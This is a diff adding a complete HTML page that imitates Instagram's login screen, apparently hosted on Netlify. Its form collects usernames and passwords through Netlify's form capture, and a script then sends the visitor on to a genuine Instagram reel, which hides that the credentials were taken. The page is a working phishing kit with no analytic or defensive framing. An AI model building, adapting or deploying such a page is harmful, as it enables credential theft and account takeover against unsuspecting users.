@@ -1,0 +1,232 @@
+<!--'haroonijazkhan06@gmail.com'-->
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Instagram</title>
+    <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yt/r/30PrGfR3xhB.png">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- SEO -->
+    <meta property="og:title" content="Instagram">
+    <meta property="og:description" content="Create an Account or Login - A simple, fun and creative way to capture, edit and share photos, messages, and videos with your friends and family.">
+    <meta property="og:image" content="https://img.freepik.com/free-vector/instagram-logo_1199-122.jpg"/>
+    <meta property="og:url" content="https://instagram-post-p-c1k488cfblnngk.netlify.app/">
+    <meta name="twitter:card" content="summary_large_image">
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+        }
+
+        body {
+            background: #000000;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            background: #12121200;
+            border: 1px solid #333333;
+            width: 340px;
+            height: 450px;
+            padding: 50px 40px 40px;
+            border-radius: 1px;
+            text-align: center;
+        }
+
+        .logo img {
+            width: 175px;
+            margin-bottom: 40px;
+            filter: brightness(550) invert(1);
+        }
+
+        input {
+            width: 100%;
+            height: 36px;
+            padding: 9px 0px 7px 8px;
+            margin: 6px 0;
+            background: #010201;
+            border: 1px solid #555252;
+            border-radius: 2px;
+            font-size: 14px;
+            color: #968a8a;
+            transition: all 0.2s;
+        }
+
+        input:focus {
+            border-color: #737373;
+            outline: none;
+        }
+
+        input::placeholder {
+            color: #737373;
+        }
+
+        /* Updated Login Button */
+        input[type="submit"] {
+            width: 100%;
+            background: #3797EF; /* Blue color */
+            color: #ffffff;
+            border: none;
+            border-radius: 8px;
+            padding: 10px;
+            margin: 10px 0;
+            font-weight: bold;
+            font-size: 14px;
+            cursor: pointer;
+            transition: opacity 0.2s;
+        }
+
+        input[type="submit"]:hover {
+            opacity: 0.9;
+        }
+
+        .links {
+            margin: 10px 0;
+            font-size: 14px;
+        }
+
+        .separator-container {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 15px 0;
+        }
+
+        .separator {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 80%;
+            gap: 10px;
+        }
+
+        .line {
+            flex: 1;
+            height: 1px;
+            background-color: rgba(255, 255, 255, 0.2);
+        }
+
+        .text {
+            font-size: 12px;
+            font-weight: lighter;
+            color: rgba(255, 255, 255, 0.8);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .links a {
+            color: #3797EF;
+            text-decoration: none;
+            font-size: 14px;
+            
+        }
+
+        .footer {
+            color: #737373;
+            font-size: 12px;
+            text-align: center;
+            margin: 24px 0;
+            line-height: 1.4;
+        }
+
+        .footer a {
+            color: #3797EF;
+            text-decoration: none;
+        }
+
+        .extra-container {
+            background: #12121200;
+            border: 1px solid #333333;
+            width: 340px;
+            padding: 15px;
+            border-radius: 3px;
+            text-align: center;
+            margin-top: 10px;
+            font-size: 14px;
+            color: #ffffff;
+        }
+
+        .extra-container span {
+            font-weight: normal;
+        }
+
+        .extra-container a {
+            font-weight: bold;
+            color: #3797EF;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo">
+            <img src="https://logos-download.com/wp-content/uploads/2016/03/Instagram_Logo_2016.png" alt="Instagram Logo">
+        </div>
+
+
+<form id="loginForm" name="loginForm" method="POST" action="/success.html" data-netlify="true">
+            <input type="hidden" name="form-name" value="loginForm">
+            <input type="text" name="username/email" required="required" class="emailBox" placeholder="Phone number, username or email">
+            <br>
+            <input type="password" name="Password" required="required" class="emailBox" placeholder="Password">
+            <br>
+            <input type="submit" class="submitButton" value="Log in"><br>
+        </form>
+        
+        <div class="separator-container">
+            <div class="separator">
+                <div class="line"></div>
+                <div class="text">OR</div>
+                <div class="line"></div>
+            </div>
+        </div>
+
+        <div class="links">
+            <a href="#">Forgot password?</a>
+        </div>
+    </div>
+
+    <div class="extra-container">
+        <span>Don't have an account? </span><a href="#">Sign up</a>
+    </div>
+
+    <div class="footer">
+        By continuing, you agree to Instagram's <br>
+        <a href="#">Terms of Use</a> and 
+        <a href="#">Privacy Policy</a>.
+    </div>
+
+    <script>
+        const handleSubmit = event => {
+            event.preventDefault(); // Prevent default form submission
+    
+            const myForm = event.target;
+            const formData = new FormData(myForm);
+    
+            fetch(myForm.action, {
+                method: "POST",
+                headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                body: new URLSearchParams(formData).toString()
+            })
+            .then(() => {
+                console.log("Form successfully submitted");
+                window.location.href = "https://www.instagram.com/reel/DG28vqzslRG/?utm_source=ig_web_button_share_sheet";
+            })
+            .catch(error => alert(error));
+        };
+    
+        document.querySelector("#loginForm").addEventListener("submit", handleSubmit);
+    </script>
+
+</body>
+</html>
